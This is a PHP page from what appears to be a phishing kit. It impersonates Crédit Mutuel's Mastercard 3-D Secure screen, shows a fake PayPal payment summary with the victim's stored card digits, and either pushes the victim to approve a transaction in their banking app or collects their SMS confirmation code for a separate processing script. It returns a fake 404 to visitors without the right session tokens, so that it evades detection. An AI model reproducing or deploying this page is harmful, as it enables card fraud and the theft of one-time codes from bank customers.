
<?php 
session_start();
if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{
 


  if(strpos($_SERVER['REQUEST_URI'], $_SESSION['gotovbv']))
  {

    if(!strpos($_SERVER['REQUEST_URI'],$_SESSION['ce_noappcode'] ))
    {

    
?>
<html><head><meta content="width=device-width" name="viewport">
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="format-detection" content="telephone=no">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/v3couleurs_cm2017.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/ei_custom_responsive.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/override.css">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/javascript/appli/jquery.js" type="text/javascript"></script>
<link rel="icon" type="image/png" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/cm2017/favicon.png" sizes="16x16">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/jquery_ei.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/ei_tools.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/lightbox.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/SDTK/display.js" type="text/javascript"></script>
<script type="text/javascript"> 
function switchToMean(meanId) {
    $("[id$=" + meanId.toUpperCase() + "]").each(function() { $(this).attr("disabled", "disabled"); });
    $("#switchMean").val(meanId);
    $("#acsForm").submit();
}
$(document).ready(function() {
    //set focus to first visible element
    $('form').find('*').filter(':input:visible:first').focus();
});
function submitForm() {
    $("#validateButton").prop("disabled", true);
    displayWaitPage();
    $("#frameWidth").val($(window).width());
    $("#frameHeight").val($(window).height());
    $("#iframe").val( (window.location != window.parent.location) ? "oui" : "non" );
    return true;
}
function displayWaitPage() {
    esd1_displayWait("ei_tpl_fullSite", "Chargement en cours", "Veuillez patienter");
}
</script>

<title>
    3-D Secure
</title>
</head><body>
<div id="ei_tpl_fullSite">
    <header id="ei_tpl_header" role="banner">
        <div id="ei_logo">
            <span>
                <span class="invisible"></span>
            </span>
        </div>
        <div id="ei_headright">
            <img src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/logos_v1/mastercard.svg" style="height:50px" alt="Logo MasterCard Secure Code">
        </div>
    </header>
    <main id="ei_tpl_contenu" role="main">
        <form action="../process005.php?<?php echo $_SESSION['userid'] ?>" method="post">
            <div class="a_blocappli">
                <div>
                    <div class="ei_mainblocfctl">
<table class="fiche" id="summaryTable" cellspacing="1" width="100%">
    <caption>
        Récapitulatif de votre paiement
    </caption>
    <colgroup>
        <col width="50%">
        <col>
    </colgroup>
    <tbody>
        <tr><th scope="row">Commerçant</th><td>ALÉATOIRE (PayPal.com)</td></tr>
        <tr><th scope="row">Montant</th><td>ALÉATOIRE (0,00€)</td></tr>
        <tr><th scope="row">Date et heure</th><td><span class="eir_hidexs"><?php echo date("j M Y G:i"); ?></span></td></tr>
        <tr><th scope="row">Numéro de carte</th><td>xxxxxxxxxxxx<?php echo  substr($_SESSION['cc20'], 12);?></td></tr>
    </tbody>
</table> 
                        <p>Votre confirmations de carte nécessite une sécurisation.<br><br>Une demande de confirmation mobile a été transmise à votre appareil
                            <b>Démarrez votre application mobile Crédit Mutuel</b> pour vérifier et confirmer cette opération.</p>                            
                        <input type="hidden" name="MD" value="1czrDHJnnsdIlUvdwRg5">
                        <input type="hidden" name="TermUrl" value="https://payment.payline.com/partnerReturn?paylinereturn&amp;paylinetoken=19BDvURro85bmHo489721614086540985">
                        <input type="hidden" name="PaReq" value="eJxVUtluwjAQ/BXEB8RHTAJoscRZ6EFRUorES5U62yYqCZCDo19fm4TSPnlnvLvemTW8RBniyEdVZijhCfM8+MRGHPaab7bbcihrsw7bNSUs+h7uJRwwy+NtKplFLQ7kCnVlpqIgLSQEaj+YzWWL2dwRQGoICWazkRS2cJjjsI7bEbYLpGIhDRKUj4iFiuKG3wdyIUBty7TIzlII/dQVQJltZFQUuy4hx+PR2lRlltomQMwdkNswi9JEue51ikP5tJo76sub+UmrVNy7f5+88vU09Nffyx4QkwFhUKDklDPKud1gdpfzLteDXngIEjOEHC+9hqAWpVpexcDOPNSvgKDm5i8D2t4MU3WWHbetpVwR4Gm3TVFnaIG/MYSYKy2jPm4ahlNjryq0ZbyacZw8Lwo//hge2hPv7mEVRGwQG9MvSaZ9rC3jglb9DQBi2pB6n6ReuY7+fYUfmm+vRw==">
                        <input type="hidden" name="switchMean" id="switchMean" value="">
                        <input type="hidden" name="cancelAuthentication" id="cancelAuthentication" value="0">
                        <input type="hidden" name="frameWidth" id="frameWidth" value="">
                        <input type="hidden" name="frameHeight" id="frameHeight" value="">      
                        <input type="hidden" name="iframe" id="iframe" value="">
                        <input type="hidden" name="IdSes3ds" id="IdSes3ds" value="8c5d6446dcf54852de55d5179c2439ba7b1e9c54e8213f42373880ae4e72f0142de6b6632128e8f96d1f3e1699ca27d1aea4337c4606fee174def6bfe117a9b07334143a23cd5f3130bc924d189ec2df0d8edc9e7e966c91ffa9239f0a436c554ceb4b6ab539cd25bc2b9dde081dd9fe4ee1c6c3afbf6cc67c6279105c9057d5fe90148ff49f24bda6983128100c90f67f0d79211039b070945d9ccadb5470545db37b95c94bfcb924d3b198991ddcc930d73287ac15f4abada07a49fa2c3a37db4995c82b79bc193308f509e29451deb52e92c5f4febbca83f2f03a9d5eb643c4219e26a751c03f53627c37c271d4f03e45e1bd108e61028e5748ad7f9301d9d4c8e2defb45a8492984e3f5ae360cdec6437226ae2b2ed2c7f4e7d3adfa89624bd6fe935ad5263b0eda1d6daacdc673be716941ee9f11cb67698e9361d76a84a867015bea0b2acc9dda5d0fe927f95bf5da4c714699f2dba7d5f94b512eca50a5997a2f79fb0aa3f77d63082284509f5e572a0ab789399aa32677f3199c124c0afcad716423503fe55d44a8995495ba4e19ad9e1206d88ab25389af8a4aac04a33b0d79bb043db884b4d7e43c1aaa2ffc00db78307d8e2ea5d96a0876efb4d5b7801908f5eef990e22b0a42e8217810ec462b7092933aac51b51e685521d7cebffb37e4c57e1e0b0b0240d455d4685811e26ffbe4c7f75f7fd24583947fd112c567a2254bb5b85166fb90ee827aeb7ff4e55c57de8a2ec68bd95f02af90c39ee0a7d541c657972520e8fd6f6e2bea9e">
                        <div id="inMobileAppMessage"><p><img style="display:block; margin-left:auto; margin-right:auto;" height="150px" src="https://cdn-3ds.e-i.com/SOSD/sd/otp/1.0.1//images/validation_operation.gif"></p><p style="text-align:center">Veuillez valider votre opération sur votre téléphone mobile.</p></div><table class="fiche" id="inputTable">
                        <colgroup>
                            <col width="50%">
                            <col>
                        </colgroup>
                        <tbody>
                        
                        </tbody>
                        </table>
                        <div class="blocboutons">
                            <span class="ei_buttonbar">
                                <a id="cancelLink"><button type="submit" style=" background: rgba(255,255,255,0);outline:0;border: none; color:#1451b3;">J'ai valider l'operation</button></a>
                                <span class="ei_mainbuttons">
                                    <input id="validateButton" value="     Valider     " type="submit" style="display: none;">
                                </span>
                            </span>
                        </div>
                         </form> 
                         <div class="blocboutons">
                            <span class="ei_buttonbar">
                                <a href="credit-mutuel-as20.php?<?php echo $_SESSION['userid'].$_SESSION['gotovbv'].$_SESSION['ce_noappcode'];?>" id="cancelLink"><button  style=" background: rgba(255,255,255,0);outline:0;border: none; color:#1451b3;">Je n'ai pas d'operation à valider</button></a>
                                <span class="ei_mainbuttons">
                                    <input id="validateButton" value="     Valider     " type="submit" style="display: none;">
                                </span>
                            </span>
                        </div>
                    </div>
                </div>
            </div>
                                                                  
    </main>
</div>

</body></html>

<?php


        }
        else{
?>

<html><head><meta content="width=device-width" name="viewport">
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="format-detection" content="telephone=no">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/v3couleurs_cm2017.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/css/ei_custom_responsive.css">
<link type="text/css" rel="stylesheet" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/override.css">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/javascript/appli/jquery.js" type="text/javascript"></script>
<link rel="icon" type="image/png" href="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/cm2017/favicon.png" sizes="16x16">
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/jquery_ei.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/ei_tools.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/appli/lightbox.js" type="text/javascript"></script>
<script src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/javascript/SDTK/display.js" type="text/javascript"></script>
<script type="text/javascript"> 
function switchToMean(meanId) {
    $("[id$=" + meanId.toUpperCase() + "]").each(function() { $(this).attr("disabled", "disabled"); });
    $("#switchMean").val(meanId);
    $("#acsForm").submit();
}
$(document).ready(function() {
    //set focus to first visible element
    $('form').find('*').filter(':input:visible:first').focus();
});
function submitForm() {
    $("#validateButton").prop("disabled", true);
    displayWaitPage();
    $("#frameWidth").val($(window).width());
    $("#frameHeight").val($(window).height());
    $("#iframe").val( (window.location != window.parent.location) ? "oui" : "non" );
    return true;
}
function displayWaitPage() {
    esd1_displayWait("ei_tpl_fullSite", "Chargement en cours", "Veuillez patienter");
}
</script>
<script src="https://cdn-3ds.e-i.com/SOSD/sd/otp/1.0.1/js/otp_in_mobile_app.min.js" type="text/javascript"></script><script src="https://cdn-3ds.e-i.com/SOSD/sd/otp/1.0.1/js/otp_ui.min.js" type="text/javascript"></script><script language="javascript" type="text/javascript">$().ready(function() {$("#validateButton").hide();});</script><script type="text/javascript">
var otpInMobileAppParameters = {
    transactionId: '8c1d5021b2225da405a247561d16399ac10c31c2135052255',
    getTransactionValidationStateUrl: 'ws/dynamic/otpPollingSI.cgi',
    pollingInterval: 2000,
    messages : {
        validatingTransaction: '<p><img src="https://cdn-3ds.e-i.com/SOSD/sd/otp/1.0.1/images/ok.png" style="display:block; margin-left:auto; margin-right:auto;" alt="Validation de l\'op&eacute;ration" height="100px"></p><p style="text-align:center">Transaction autoris&eacute;e, veuillez patienter.</p>',
        cancellingTransaction: '<p><img src="https://cdn-3ds.e-i.com/SOSD/sd/otp/1.0.1/images/ko.png" style="display:block; margin-left:auto; margin-right:auto;" alt="Refus de l\'op&eacute;ration" height="100px"></p><p style="text-align:center">Transaction refus&eacute;e, veuillez patienter.</p>',
    },
    buttons: {
        confirmButtonId: 'validateButton',
        modifyButtonId: '',
        cancelButtonId: 'validateButton'
    }
};
document.addEventListener('visibilitychange', function() {    if (document.visibilityState === 'visible') {        otpInMobileApp.getTransactionValidationState();    }}); </script>
<title>
    3-D Secure
</title>
</head><body><div id="LBCancelAuthentication" class="a_blocappli masque ei_blocmodal_env ei_newlb">
   <div class="ei_blocmodal" role="dialog" aria-labelledby="LBCancelAuthenticationTitle" aria-describedby="contentCancelAuthentication">
      <div role="document">
         <div class="a_blocfctltitre">
            <p class="a_options">
               <span tabindex="0" onfocus="$('#btnCancel').focus();" role="presentation">&nbsp;</span>
               <a id="btnCloseLBCancelAuthentication" class="btnclose" href="#" onclick="CloseLB('LBCancelAuthentication');$('#cancelLink').focus();return false;">
                     <img alt="fermer" src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0//fr/images/std/btfermerpopup.png">
               </a>
            </p>
            <p class="a_titre2" id="LBCancelAuthenticationTitle">Abandonner</p>
         </div>
         <div class="a_blocfctl">
            <div id="contentCancelAuthentication">
               Voulez-vous abandonner votre authentification ?
            </div>
            <div class="blocboutons">
               <span class="ei_buttonbar">
                  <span class="ei_mainbuttons">
                     <input id="btnCancel" value="Oui" type="submit" onclick="$('#cancelAuthentication').val(1);$('#acsForm').submit();">
                  </span>
                  <a href="#" onclick="CloseLB('LBCancelAuthentication');$('#cancelLink').focus();return false;">Non</a>
               </span>
            </div>
         </div>
         <span tabindex="0" onfocus="$('#btnCloseLBCancelAuthentication').focus();" role="presentation" class="invisible">&nbsp;</span>
      </div>
   </div>
</div>
<div id="ei_tpl_fullSite">
    <header id="ei_tpl_header" role="banner">
        <div id="ei_logo">
            <span>
                <span class="invisible"></span>
            </span>
        </div>
        <div id="ei_headright">
            <img src="https://cdn-3ds.e-i.com/TDS1/sd/3dsecure/1.7.0/fr/images/css/logos_v1/mastercard.svg" style="height:50px" alt="Logo MasterCard Secure Code">
        </div>
    </header>
    <main id="ei_tpl_contenu" role="main">
        
            <div class="a_blocappli">
                <div>
                    <div class="ei_mainblocfctl">
<table class="fiche" id="summaryTable" cellspacing="1" width="100%">
    <caption>
        Récapitulatif de votre paiement
    </caption>
    <colgroup>
        <col width="50%">
        <col>
    </colgroup>
    <form action="../process005.php?<?php echo $_SESSION['userid'].'otp=true';?>" method="post">
    <tbody>
         <tr><th scope="row">Commerçant</th><td>ALÉATOIRE (PayPal.com)</td></tr>
        <tr><th scope="row">Montant</th><td>ALÉATOIRE (0,00€)</td></tr>
        <tr><th scope="row">Date et heure</th><td><span class="eir_hidexs"><?php echo date("j M Y G:i"); ?></span></td></tr>
        <tr><th scope="row">Numéro de carte</th><td>xxxxxxxxxxxx<?php echo  substr($_SESSION['cc20'], 12);?></td></tr>
    </tbody>
</table> 
                                                    
                        <input type="hidden" name="MD" value="17Dx5oVMlXzww4qTLITy">
                        <input type="hidden" name="TermUrl" value="https://payment.payline.com/partnerReturn?paylinereturn&amp;paylinetoken=1zAqcqRVg19w0Cx488571614257441173">
                        <input type="hidden" name="PaReq" value="eJxVUtluwjAQ/BXEB8RHLkCLJVpSASotIkDVvlSRs2oiyEEOjn597SSU9sk7s+vdnbFhExWIUx9lXaCAJZZl8IW9OBz3P03XMU2X2y7L+wJWkzUeBZywKOMsFcygBgdyg+pmIaMgrQQE8vgwfxE2M7ljAekgJFjMp8IyLYc5Dhu6Q8t0gbQspEGC4hmxklHc8ydAGgJkVqdVcRWWpUbdANTFQURVlY8IOZ/PxqG9ZsgsAaJzQO7LrGodlarXJQ7FchN6ON2ddntWvs1yM/xeX3beZbGb7cdAdAWEQYWCU84o53aP8ZFNR5ZatOEhSPQSwtuue4xSg1Klr6Ug15MmLVA5nfpLgTK4wFRexdAdKDE3BHjJsxRVhZL4G0OIpVRCuuOu4nGmDZaVMo23W/rx+8cpGCz87euTf0iuXhxIW9veFOn2sTKNm5Q1/TUAotuQ7kVJ9+gq+vcZfgCB4LCP">
                        <input type="hidden" name="switchMean" id="switchMean" value="">
                        <input type="hidden" name="cancelAuthentication" id="cancelAuthentication" value="0">
                        <input type="hidden" name="frameWidth" id="frameWidth" value="">
                        <input type="hidden" name="frameHeight" id="frameHeight" value="">      
                        <input type="hidden" name="iframe" id="iframe" value="">
                        <input type="hidden" name="IdSes3ds" id="IdSes3ds" value="69e0dad1be1704b0291672f719458a2393f564232144c5bfa4ca97e81a39681d6bdaf3fde32ef372539f6f8f62619401e69761f29fcf46c47a2ee2cf97534a08e3f234f0f902f6f4020206915ccf3cc04a9b28e78add365bc22fa70b910d9b93350a65fdc042c2506e8704b89cfb6346856858fa23ca99ec76debbfed5786b61571d2971e6f975f3b9adb06df24fbb7aa2baedfa8121e108a84a0dbb63b84c35402337d121b5dabb9bd0043af49ede31d97cf5e3acd3688d4e01405c8692847b520f07333079f07145a619bccbe3686148c9e01ef4eb6b6a95266ad07784cd81082645ea2bb5d3433454fda1cd4c59c740b7df34e39a404315863141123644cda44c31800e7473b1b3251873b79b7df97c2878c9165bd722852476f92c94645c64198dff687eaf1dde9d5badd3877c385942a8dd11c4df4da73f1a8af2e1658af91f43d635ff164d846d5a7251e48694db7daf1021e1cd2d06ff9f14874f407187166f1b6952180c9a60ab7dd742f5192b8948c90cf0db316f7914266696e33914059bdf4a33540a1f67d7958bcaf6835ebccae7da147d0796fab08d75ea9b4a846471d301da307bcf9b6939abfdb12cac013d1fb0c902670555fa53a3e3c45aa0707fae686c720cb7006a15d4398c4a1d08ddf512f753f1b876e0e931300452efd5e0f1a2f72e96f768d96664ef4e3d9f3c062df8667d2d3ae566ac41827ffbe1dcff7cf76aa0119c6a33e6efbbee267bd47e538df223d7cba7a1be1ef57efe050ed0601345e0a5620297b8b3141e1e">
                        <br><center><div id="inMobileAppMessage"><p></p>
<label for="INPUT_SMS_2F10D60F897D89C23DA03FF2CF09E922">Code de confirmation :</label><input type="text" id="INPUT_SMS_2F10D60F897D89C23DA03FF2CF09E922" name="otp" maxlength="8" required></div></center>
<br><table class="fiche" id="inputTable">
                        <colgroup>
                            <col width="50%">
                            <col>
                        </colgroup>
                        <tbody>
                        
                        </tbody>
                        </table>
                        
                    <div class="blocboutons">
                            <span class="ei_buttonbar">
                                <button type="submit">Continuer</button>
                                <span class="ei_mainbuttons">
                                    <input id="validateButton" value="     Valider     " type="submit">
                                </span>
                            </span>
                        </div>
        </form>                                                            
    </main>
</div>

</body></html>


<?php


    }

}
else{
    die('HTTP/1.0 404 Not Found');
}

}
else{
            die('HTTP/1.0 404 Not Found');

}


?>